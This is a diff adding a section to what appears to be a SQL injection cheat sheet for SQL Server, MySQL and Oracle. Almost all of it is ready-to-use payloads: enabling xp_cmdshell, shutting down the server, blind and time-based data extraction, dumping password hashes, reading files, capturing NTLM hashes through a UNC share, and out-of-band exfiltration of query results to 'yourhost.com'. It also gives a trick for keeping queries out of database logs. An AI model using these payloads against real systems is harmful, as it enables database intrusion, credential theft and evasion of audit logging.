@@ -249,6 +249,231 @@ IS_SRVROLEMEMBER(Transact-SQL)
 OPENDATASOURCE(Transact-SQL)
 insert tbl exec master..xp_cmdshell OSQL /Q"DBCC SHOWCONTIG"
 
+-- SQL Injection in LIMIT(M) or ORDER(MSO)
+select id,product from test.test t limit 0,0 union all select 1,'x'/*,10;
+# If injection is in second limit you can comment it out or use in your union injection
+
+-- Shutdown SQL Server(S)
+'; shutdown --
+
+-- Enabling xp_cmdshell in SQL Server 2005
+# By default xp_cmdshell and couple of other potentially dangerous stored procedures are disabled in SQL Server 2005. If you have admin access then you can enable these.
+EXEC sp_configure 'show advanced options',1
+RECONFIGURE
+EXCE sp_configure 'xp_cmdshell',1
+RECONFIGURE
+
+-- Finding Database Structure in SQL Server(S)
+# Getting User defined Tables
+select name from sysobjects where xtype='U'
+# Getting Column Names
+select name from syscolumns where id = (select id from sysobjects where name = 'tablenameforcolumnnames')
+
+```
+
+### Moving records(S)
+```sql
+-- Modify where and use NOT IN or NOT EXIST
+... where users not in ('First User','Second User')
+select top 1 name from members where not exist(select top 0 name from members) -- very good one
+
+-- Using Dirty Tricks
+select * from product where id = 2 and 1=cast((select p.name from (select (select count(i.id) as rid from sysobjects i where i.id<=0.id) as x, name from sysobjects 0) as p where p.x=3) as int
+Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype='U' and i.id<=o.id) AS x, name from sysobjects o WHERE o.xtype = 'U') as p where p.x=21
+
+-- Fast way to extract data from Error Based SQL Injections in SQL Server(S)
+';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @rd=@rd+' '+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'MEMBERS') AND name>@rd SELECT @rd AS rd into TMP_SYS_TMP end;--
+
+-- Finding Database Structure in MySQL(M)
+# Getting User defined Tables
+select table_name from information_schema.tables where tables_schema = 'databasename'
+# Getting Column Names
+select table_name,column_name from information_schema.columns where table_name = 'tablename'
+
+-- Finding Database Structre in Oracle(O)
+# Getting User defined Tables
+select * from all_tables where owner = 'database_name'
+# Getting Column Names
+select * from all_col_comments where table_name ='table'
+
+```
+
+### Blind SQL Injection
+```sql 
+/*
+ * About Blind SQL Injections
+ * In a quite good production application generally you can not see error responses on the page,so you can not extract data through Union attacks or error based attacks. You have to do use Blind SQL Injections attacks to extract data. There are two kind of Blind Sql Injection.
+ * Normarl Blind
+ *   You can not see a response in the page,but you can still datermine result of a query from reponse or HTTP status code
+ * Totally Blind
+ *   You can not see any difference in the output in any kind. This can be an injection a logging function or similar. Not so common,thought.
+ * In normal blinds you can use "if statements" or abuse WHERE query in injection(generally easier),in totally blinds you need to use some waiting functions and analyze response times. For thsi you can use WAITFOR DALAY '0:0:10' in SQL Server, BENCHMARK() and SLEEP(10) in MySQL,PG_SLEEP(10) in PostgreSQL, and some PL/SQL tricks in ORACE.
+ */ 
+ 
+-- Real and a bit Comples Blind SQL Injection Attack Sample
+#This output taken from a real private Blind SQL Injection tool while exploiting SQL Server back ended application and enumerating table names. This requests done for first char of the first table name. SQL queries a bit more complex then requirement because of automation reasons. In we are trying to determine an ascii value of a char via binary search algorithm.
+# TRUE and False flags mark queries returned true or false
+TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>78--
+FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>103--
+
+TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)
+FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>89-- 
+
+TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
+FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>83-- 
+
+TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
+FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>80-- 
+
+FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)
+
+-- Making Databases Wait/Sleep For Blind SQL Injection Attacks
+# First of all use this if it's really blind, otherwise just use 1/0 style errors to identify difference. Second, be careful while using times more than 20-30 seconds. database API connection or script can be timeout.
+# WAITFOR DELAY 'time' (S)
+# This is just like sleep, wait for specified time. CPU safe way to make database wait.
+WAITFOR DELAY '0:0:10'-- 
+# Also,you can use fractions like this
+WAITFOR DELAY '0:0:0.51'
+
+-- Real World Samples
+# Are we 'sa'?
+if (select user) = 'sa' waitfor delay '0:0:10'
+# Productid =1;waitfor delay '0:0:10'-- 
+# ProductID =1);waitfor delay '0:0:10'--
+# ProductID =1';waitfor delay '0:0:10'--
+# ProductID =1');waitfor delay '0:0:10'--
+# ProductID =1));waitfor delay '0:0:10'--
+# ProductID =1'));waitfor delay '0:0:10'--
+
+# BENCHMARK()(M)
+# Basically, we are abusing this command to make MySQL wait a bit. Be careful you will consume web servers limit so fast!
+BENCHMARK(howmanytimes, to this)
+-- Real World Samples
+# Are we root? woot!
+if exists (select * from users where username = 'root') BENCHMARK(1000000000,MD5(1))
+# Check Table exist in MySQL
+if (select * from login) BENCHMARK(1000000000,MD5(1))
+
+```
+
+### Covering Your Tracks
+```sql
+SQL Server - sp_password log bypass(S)
+SQL Server don't log queries that includes sp_password for security reaonse(!). So if you add --sp_password to your queries it will not be in SQL Server logs(of curse still will be in web server logs. try to use POST if it's possible)
+```
+
+### Clear SQL Injection Tests
+```sql
+#These tests are simply good for blind sql injection and silent attacks.
+-- product.asp?id=4 (SMO)
+product.asp?id=5-1
+product.asp?id=4 or 1=1
+
+-- product.asp?name=Book
+product.asp?name=Bo'%2b'ok
+product.asp?name=Bo' || 'ok (OM)
+product.asp?name=Book' or 'x'='x
+```
+
+### Extra MySQL Notes
+```sql
+# Sub Queries are working only MySQL 4.1+
+# Users
+select user,password from mysql.user
+select 1,1 union select if(substring(password,1,1)='2',Benchmark(100000,sha1(1)),0) user,password from mysql.user where user='root';
+# select ect ... into dumpfile
+# write query into a new file(can not modify existing files)
+
+-- UDF Function
+create function LockWorkStation returns integer soname 'user32';
+select LockWorkStation();
+create function ExitProcess returns integer soname 'kernel32';
+select ExitProcess();
+select User();
+select password,User() from mysql.user;
+# First byte of admin hash
+select substring(user_password,1,1) from mb_users where user_group = 1;
+# Read File
+query.php?user=1+union+select+load_file(ox63...),1,1,1,1,1
+# MySQL Load Data infile
+# By default it's not available!
+create table foo(line blob);load data infile 'c:/boot.ini' into table foo;select * from foo;
+# More Timing in MySQL
+select benchmark(500000, sha1('test'));
+query.php?user=1+union+select+benchmark(500000,sha1(0x414141)),1,1,1,1
+select if( user() like 'root@%',benchmark(100000,sha1('test')),'false');
+
+# Enumeration data, Guessed Brute Force
+select if( (ascii(substring(user(),1,1)) >> 7) & 1,benchmark(100000,sha1('test')), 'false');
+
+#Potentially Useful MySQL Functions
+md5() -- md5 hashing
+sha1() -- sha1 hashing
+password()
+encode()
+compress() -- Compress data,can be great in large binary reading in Blind SQL Injections.
+row_count()
+schema()
+version() -- same as @@version
+
+```
+
+## Second Order SQL Injection (二阶段SQL注入)
+```sql
+# Basically.you put an SQL Injection to some place and expect it's unfiltered in another action. This is common hidden layer problem.
+# Name: ' + (select top 1 password from users) + '
+# Email: xx@xx.com
+
+/*
+If application is using name field in an unsafe stored procedure or function, process etc. then it will insert first users password as your name etc.
+Forcing SQL Server to get NTLM Hashes
+
+This attack can help you to get SQL Server user's Windows password of target server, but possibly you inbound connection will be firewalled. Can be very useful internal penetration tests. We force SQL Server to connect our Windows UNC Share and capture data NTLM session with a tool like Cain & Abel.
+Bulk insert from a UNC Share (S) 
+
+Check out Bulk Insert Reference to understand how can you use bulk insert
+ */
+bulk insert foo from '\\YOURIPADDRESS\C$\x.txt'
+```
+
+### Out of Band Channel Attacks
+```sql
+-- SQL Server
+?vulnerableParam=1; SELECT * FROM OPENROWSET('SQLOLEDB', ({INJECTION})+'.yourhost.com';'sa';'pwd', 'SELECT 1')
+Makes DNS resolution request to {INJECT}.yourhost.com
+
+?vulnerableParam=1; DECLARE @q varchar(1024); SET @q = '\\'+({INJECTION})+'.yourhost.com\\test.txt'; EXEC master..xp_dirtree @q
+Makes DNS resolution request to {INJECTION}.yourhost.com
+
+{INJECTION} = You want to run the query.
+
+-- MySQL
+
+
+    ?vulnerableParam=-99 OR (SELECT LOAD_FILE(concat('\\\\',({INJECTION}), 'yourhost.com\\')))
+    Makes a NBNS query request/DNS resolution request to yourhost.com
+
+    ?vulnerableParam=-99 OR (SELECT ({INJECTION}) INTO OUTFILE '\\\\yourhost.com\\share\\output.txt')
+    Writes data to your shared folder/file
+
+    {INJECTION} = You want to run the query.
+-- Oracle
+
+
+?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/ sniff.php?sniff='||({INJECTION})||'') FROM DUAL)
+Sniffer application will save results
+
+?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/ '||({INJECTION})||'.html') FROM DUAL)
+Results will be saved in HTTP access logs
+
+?vulnerableParam=(SELECT UTL_INADDR.get_host_addr(({INJECTION})||'.yourhost.com') FROM DUAL)
+You need to sniff dns resolution requests to yourhost.com
+
+?vulnerableParam=(SELECT SYS.DBMS_LDAP.INIT(({INJECTION})||'.yourhost.com',80) FROM DUAL)
+You need to sniff dns resolution requests to yourhost.com
+
+{INJECTION} = You want to run the query.
+
 ```
 
 ## 注入方法
